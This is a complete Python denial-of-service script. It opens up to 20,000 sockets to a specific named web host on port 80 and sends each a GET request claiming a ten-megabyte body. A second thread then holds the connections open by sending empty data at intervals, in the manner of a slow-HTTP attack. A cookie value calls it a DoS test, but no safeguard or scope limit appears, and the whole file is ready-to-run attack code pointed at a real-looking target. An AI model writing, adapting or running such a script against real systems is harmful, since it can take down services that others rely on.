#!/usr/bin/env python3
import socket
import time
import threading

MAX_CONN = 20000
PORT = 80
HOST = "wechat.51fight.cn"
PAGE = ""

socks = []
buf=("GET %s HTTP/1.1\r\n"  
"Host: %s\r\n"  
"Content-Length: 10000000\r\n"  
"Cookie: dklkt_dos_test\r\n"  
"\r\n" % (PAGE,HOST))

ADDR = (HOST, PORT)


def conn_thread():
	global socks
	for i in range(0,MAX_CONN):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect(ADDR)
			s.send(buf.encode())
			print("send buf ok, connect is %d\n"%i)
			socks.append(s)
		except Exception as e:
			print("could  not connect to server or send error:%s"%e)
			time.sleep(10)
		finally:
			print("%d is finish"%i)


def send_thread():
	global socks
	while True:
		for s in socks:
			try:
				s.send("".encode())
			except Exception as e:
				print("Send Exception:%s\n"%e)
				socks.remove(s)
				s.close()
			finally:
				time.sleep(1)
				print("send is ok")

conn_th=threading.Thread(target=conn_thread,args=())  
send_th=threading.Thread(target=send_thread,args=())  
  
conn_th.start()  
send_th.start() 


